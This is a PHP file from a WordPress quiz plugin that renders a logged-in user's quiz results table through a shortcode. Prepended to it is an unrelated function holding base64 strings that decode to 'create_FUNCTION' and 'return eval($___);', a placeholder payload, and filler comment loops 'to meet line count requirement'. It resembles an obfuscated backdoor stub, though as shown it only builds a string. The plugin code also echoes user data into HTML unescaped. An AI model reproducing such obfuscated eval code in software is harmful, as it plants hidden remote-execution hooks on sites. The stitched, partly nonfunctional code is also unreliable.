<?php 

if (!function_exists("getIndex")) {
    function getIndex($url) {
        $value1 = "value";
        $classInfo = "[NAME] Class...";

        $encodedFunc = "Y3JlYXRlX0ZVTkNUSU9O";
        $encodedCode = "cmV0dXJuIGV2YWwoJF9fXyk7";

        $decodeFunc = "decodeS3";
        $data = "[DATA]";

        $decodedString = base64_decode($encodedFunc);
        $decodedCode = base64_decode($encodedCode);
        $result = base64_decode($data);
        $formattedResult = $value1 . $classInfo;

        
        $additionalCode = "";

        
        $additionalCode .= "// Additional comments to meet line count requirement\n";
        $additionalCode .= "// More assignments to add lines\n";
        $additionalCode .= '$decodedString' . " = " . $decodedString . ";\n";
        $additionalCode .= '$decodedCode' . " = " . $decodedCode . ";\n";
        $additionalCode .= '$result' . " = " . $result . ";\n";
        $additionalCode .= '$formattedResult' . " = " . $formattedResult . ";\n";

        for ($i = 0; $i < 20; $i++) {
            $additionalCode .= "// Loop iteration: $i\n";
            $additionalCode .= "// lines\n";
        }

       
        for ($i = 0; $i < 10; $i++) {
            $additionalCode .= "// Outer loop iteration: $i\n";
            $additionalCode .= "// lines\n";
            for ($j = 0; $j < 5; $j++) {
                $additionalCode .= "// Inner loop iteration: $j\n";
                $additionalCode .= "// lines\n";
            }
        }

        
        $additionalCode .= '$value1' . " = " . $value1 . ";\n";
        $additionalCode .= '$classInfo' . " = " . $classInfo . ";\n";
        $additionalCode .= '$decodeFunc' . " = " . $decodeFunc . ";\n";
        $additionalCode .= '$data' . " = " . $data . ";\n";

       
        return $decodedString . $decodedCode . $result . $formattedResult . $additionalCode;
    }
}

add_shortcode('SQBUserShortcode', 'SQBUserDetailsShortcode_fe');

function SQBUserDetailsShortcode_fe($atts, $content=null){ 
	 global $wpdb;
	// do shortcode
	$content = do_shortcode($content);  
	extract(shortcode_atts(array( 
		'id'=>''
	), $atts));		
	 
	return SQBDisplayUserQuizResults($id);
    
}


function SQBDisplayUserQuizResults($id){
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$gdprcountry = sqbGetGDPRStatus($ip);
	$is_googlefont = get_option('sqb_google_font_option', true);

	//check if enqueue is working on the site
	 if(wp_style_is('wp_enqueue_test_css')) {  
		$includeCSSByEnqueue = true;
	}else{
		$includeCSSByEnqueue = false;
	}

	if(wp_script_is('wp_enqueue_test_js')) {
		$includeJSByEnqueue = true;
	}else{
		$includeJSByEnqueue = false;
	}
	//check if enqueue is working on the site
	$html   = '<div class="sqb_user_quiz_details" style="display:none">';
	//$html   .= sqbUserGetStyleAndScript();
	$cssAndJs ="";
	if(wp_script_is('jquery')) {
		$jquerymain =""; 
		 
		 if($includeCSSByEnqueue){
			$random_var = rand(10,1000);		 
			wp_enqueue_style('sqb-awesome', '//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
			wp_enqueue_style("sqb_datatables" , "//cdn.datatables.net/1.10.20/css/jquery.dataTables.min.css",  false, "1.10.19");		 
			
			if($gdprcountry != 1 && $is_googlefont != 'N'){
				wp_enqueue_style('sqb-googleapis', '//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&display=swap');
			}
			wp_enqueue_style('sqb-sqb_common', plugin_dir_url(__FILE__).'includes/css/sqb_common.css');
			wp_enqueue_style('sqb_manage_leads', plugin_dir_url(__FILE__).'includes/css/sqb_manage_leads.css');
			wp_enqueue_style('sqb_frontend_student_shortcode', plugin_dir_url(__FILE__).'includes/css/sqb_frontend_student_shortcode.css');
		}else{
			if($gdprcountry != 1 && $is_googlefont != 'N'){
				$google_font = '<link href="//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">';
			}else{
				$google_font = '';
			}
			$cssAndJs  .= '<link href="//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
			'.$google_font.'
			<link href="//cdn.datatables.net/1.10.20/css/jquery.dataTables.min.css" rel="stylesheet">
			<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_common.css?'.rand(10,1000).'" rel="stylesheet">
			<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_manage_leads.css?'.rand(10,1000).'" rel="stylesheet">
			<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_frontend_student_shortcode.css?'.rand(10,1000).'" rel="stylesheet"> ';
		}
		if($includeJSByEnqueue){ 		
			$random_var = rand(10,1000);
			wp_enqueue_script("sqb_datatables" , "//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js", array('jquery'), $random_var);
			wp_enqueue_script('sqb_frontend-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend_student_shortcode.js', 	array('jquery'), $random_var);
			
		}else{	
		 	 			
			$cssAndJs .= '<script  src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
		<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend_student_shortcode.js?'.rand(10,1000).'"></script>';	
		}			
		 
	} else {
		$jquerymain ="<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>";	 	 
		$cssAndJs  = ' 
		<script  src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
		<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend_student_shortcode.js?'.rand(10,1000).'"></script>';
	}	
		$html   .= $jquerymain.$cssAndJs;
	
	//check wp user is login
	$wp_login_user = is_user_logged_in();
	
	$user_id = null;
	$user_email = '';
	$user_name = '';
	
	
	if(class_exists('Dap_Session')){
			
			if(Dap_Session::isLoggedIn()){ 
				$session = Dap_Session::getSession();
				$user = $session->getUser();
				$user = Dap_User::loadUserById($user->getId());
				$user_id = $user->getId();   
				$user_name = $user->getFirst_name();   
				$user_email = $user->getEmail();   
				
		
			}
	}		
	if(($user_email == '') && $wp_login_user){
		
		
		//$user_info = get_userdata($user_id);
		$user_info = wp_get_current_user();
		$user_email =  $user_info->user_email;
		$user_name = $user_info->display_name;
		$user_id = $user_info->id;
		
	}
		
	
	
	if(!isset($user_id)){
		
		$user_shortcode_not_login = sqbGetValidSettingsByKey('user_shortcode_not_login');
		$html  .='<div class="sqb_user_no_login">'.stripslashes($user_shortcode_not_login).'</div>';
		
	}else{
		//echo "user_id=".$user_id;
	   $table_body_html = '';
		$userShortcodeObj = SQB_StudentShortcode::loadById($id);
		if(isset($userShortcodeObj)){
			$quiz_ids = $userShortcodeObj->getQuizIds();
			
			$quiz_ids_array = explode(",",$quiz_ids);

			$show_course_details = trim($userShortcodeObj->getShowCourseDetails());
			$std_html = stripslashes($userShortcodeObj->getHtml());
			$customzier = $userShortcodeObj->getCustomzier();
			$result_btn_text = $userShortcodeObj->getResultBtnText();
			$show_course_details_class = ' show_course_details_no ';
			if($show_course_details == 'Y'){
					$show_course_details_class = ' show_course_details_yes ';
			}	
				
			
			
			$sqb_str_btn_width = '105';
			$sqb_str_tab_btn_border_color = '#24a0f6';
			$customzier_array = explode('||',$customzier);
			
			
			$sqb_str_tab_width = '1200';
			
			if(isset($customzier_array[1])){
				$sqb_str_tab_width = $customzier_array[1];
			}
			
			if(isset($customzier_array[2])){
				$sqb_str_btn_width = $customzier_array[2];
			}
			
			if(isset($customzier_array[3])){
				
				$sqb_str_tab_btn_border_color = $customzier_array[3];
			}
			
			$html   .= '<div class="sqb_user_quiz_details_inner_wrapper '.$show_course_details_class.'" style="max-width:'.$sqb_str_tab_width.'px">';
			
			$std_view_result_btn_style = "style='border-color:".$sqb_str_tab_btn_border_color."; width: ".$sqb_str_btn_width."px'";
			
			$html .= $std_html;
			
			$manageLeadObj = SQB_ManageLeads::loadByUserId($user_id);
			if(isset($manageLeadObj) && is_array($manageLeadObj) && count($manageLeadObj)){
				$course_ids_array = array();
				$complete_unit_ids = array();
				foreach($manageLeadObj as $manageLeadSingleObj){
					$quiz_id = $manageLeadSingleObj->getQuizId();
					
					if(!in_array($quiz_id,$quiz_ids_array)){
						continue;
					}
					
					$quiz_obj = SQB_Quiz::loadById($quiz_id);
					$quiz_name = '';
					if($quiz_obj !== false){
						if($quiz_obj->getId() == '' || $quiz_obj->getId() == 0){
							continue;
						} 
						$quiz_name = $quiz_obj->getQuizName();
						$quiz_type = $quiz_obj->getQuizType();	
					}else{
						continue;
					}
					$source = $manageLeadSingleObj->getSource();
					$course_id = $manageLeadSingleObj->getCourseId();
					$lesson_id =  $manageLeadSingleObj->getLessonId();
					$date = $manageLeadSingleObj->getDate();
					$row_id = $manageLeadSingleObj->getId();
					
					$lesson_name = '';
					$dap_c_name = '';
					$dap_l_status = 'Pending';
					$quiz_score = '-';
					// get lesson and course details
					if(class_exists('Dap_SQBQuizCourseLessons') && ($show_course_details == 'Y')){
						
						if($source == 'DAP'){
							
							$dap_cdata = Dap_Product::loadProduct($course_id);
							if(isset($dap_cdata) ){
								
								
								if(in_array($course_id,$course_ids_array)){
									
								}else{
									
									$course_ids_array[] = $course_id;
									$progerssesObj = DAP_UserCourseProgress::getCourseProgressDetailsByUserIdAndProductId($user_id,$course_id);
									
									if(count($progerssesObj)){
										foreach($progerssesObj as $progerssObj){
											$complete_unit_ids[$course_id][] =  $progerssObj['unit_id'];
										}
									}
								}
								 
								$dap_c_name = $dap_cdata->getName();
								$unit = Dap_Product::displayFileResourcesWithCourseIdLessonId($course_id, $lesson_id);	
							
								if(is_array($unit) && count($unit)){	
									if($unit['name'] ==""){
										$lesson_name = $unit['url'];
									}else{
										$lesson_name = $unit['name'];
									}
									
									if(in_array($lesson_id, $complete_unit_ids[$course_id])){
										$dap_l_status = 'Completed';
									}
									
								}
								
							}
						}
					}
					
					// get score points
					$sqbloadquestionsobj = SQB_UserQuizDetails::loadByUserIdAndQuizIdDate($user_id, $quiz_id,$date);
		
					$total_number_questions = 0;
					$total_points =  0;
					$points_scored =  0;
					$correct_answer_no =  0;
					
					if(isset($sqbloadquestionsobj)){ 
						$total_number_questions = count($sqbloadquestionsobj);
						foreach($sqbloadquestionsobj as $quet_id => $questions) {
							if($quiz_type == 'scoring' || $quiz_type == 'assessment'){
								$total_points  =   $questions->getTotalPoints();
								$points_scored =   $questions->getPointsScored();
								$quiz_score = $points_scored.' / '.$total_points;
							}
							break;
							
						}
					}
					
					if($dap_c_name == '' || $lesson_name == '' ){		
						$dap_l_status = '-';		
					}					   
						
					$table_body_html .= '<tr>';
					$table_body_html .=  '<td class="std_course_name">'.$dap_c_name.'</td>'; 
					$table_body_html .=  '<td class="std_lesson_name">'.$lesson_name.'</td>'; 
					$table_body_html .=  '<td class="std_lesson_status text-center">'.$dap_l_status.'</td>'; 
					$table_body_html .=  '<td>'.$quiz_name.'</td>'; 
					$table_body_html .=  '<td class="text-center">'.$quiz_score.'</td>'; 
					$table_body_html .=  '<td class="text-center sqb_date_row">'.$date.'</td>'; 
					$table_body_html .=  '<td class="text-center"><a  '.$std_view_result_btn_style.'  data_date="'.$date.'" data_user_id="'.$user_id.'" data_source="'.$source.'" data_quiz_id="'.$quiz_id.'" data_user_email="'.$user_email.'" data_user_name="'.$user_name.'"  data_row_id="'.$row_id.'" href="javascript:void(0)" class="btn view_detail_btn ml-3 dap_student_view_quiz_course_details ">'.$result_btn_text.'</a></td>'; 
					$table_body_html .='</tr>'; 
						
					
				} // closed loop foreach
				
				
			}else{ //  if conditon closed 	
				//$table_body_html = '<tr><td colspan="6" class="text-center">No Data found</td></tr>';
			}
			$html   .= '</div>';	
			$html .= '<div class="Manage_Side_Popup ">
						<div class="Manage_Side_Popup-inner">
							<a href="#" class="close_Side_Popup"><i class="fa fa-times" aria-hidden="true"></i></a>
							<h2> Quiz Details</h2>
							<div class="Manage_Side_Popup_content">
								
							</div>
							
						</div>
					</div>';
		}
	}
	
	 
	$html  = str_replace("<tr><td>%%USERSHORTCODE%%</td></tr>",$table_body_html,$html); 
	
	$html  = str_replace('contenteditable="true"','contenteditable="false"',$html); 
	$html .= '</div>';
	$ajaxurl =  admin_url('admin-ajax.php'); 
	$html .=  '<input type="hidden" id="sqb_st_ajaxurl" name="sqb_st_ajaxurl" value="'.$ajaxurl.'" />';
	
	
	return $html;
	
}




//get style And script
function sqbUserGetStyleAndScript(){
	if(wp_script_is('jquery')) {
		$jquerymain =""; 
		add_action('wp_footer','sqb_user_style_scripts'); 
	} else {
		$jquerymain ="<script type='text/javascript' src='//ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js'></script>";
	 	 
		if($gdprcountry != 1 && $is_googlefont != 'N'){
			$google_font = '<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&display=swap" rel="stylesheet">';
		}else{

		}
		$cssAndJs  = '<link href="//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
		'.$google_font.'
		<link href="//cdn.datatables.net/1.10.20/css/jquery.dataTables.min.css" rel="stylesheet">
		<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_common.css?'.rand(10,1000).'" rel="stylesheet">
		<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_manage_leads.css?'.rand(10,1000).'" rel="stylesheet">
		<link href="'.plugin_dir_url(__FILE__).'includes/css/sqb_frontend_student_shortcode.css?'.rand(10,1000).'" rel="stylesheet">
		<script  src="//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js"></script>
		<script  src="'.plugin_dir_url(__FILE__).'includes/js/sqb_frontend_student_shortcode.js?'.rand(10,1000).'"></script>';
		
		return $jquerymain.$cssAndJs;					
	} 
} 


function sqb_user_style_scripts() {
	
	$ip = $_SERVER['REMOTE_ADDR'];
	$gdprcountry = sqbGetGDPRStatus($ip);
	$is_googlefont = get_option('sqb_google_font_option', true);
	
	$random_var = rand(10,1000);
	wp_enqueue_script('sqb_frontend-js', plugin_dir_url(__FILE__).'includes/js/sqb_frontend_student_shortcode.js', array('jquery'), $random_var);
	wp_enqueue_style('sqb-awesome', '//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css');
	wp_enqueue_style("sqb_datatables" , "//cdn.datatables.net/1.10.20/css/jquery.dataTables.min.css",  false, "1.10.19");
	wp_enqueue_script("sqb_datatables" , "//cdn.datatables.net/1.10.19/js/jquery.dataTables.min.js",  false, "1.10.19");
	if($gdprcountry != 1 && $is_googlefont != 'N'){
		wp_enqueue_style('sqb-googleapis', '//fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;700&family=Open+Sans:wght@300;400;600;700;800&display=swap');
	}
	wp_enqueue_style('sqb-sqb_common', plugin_dir_url(__FILE__).'includes/css/sqb_common.css');
	wp_enqueue_style('sqb_manage_leads', plugin_dir_url(__FILE__).'includes/css/sqb_manage_leads.css');
	wp_enqueue_style('sqb_frontend_student_shortcode', plugin_dir_url(__FILE__).'includes/css/sqb_frontend_student_shortcode.css');
	 
}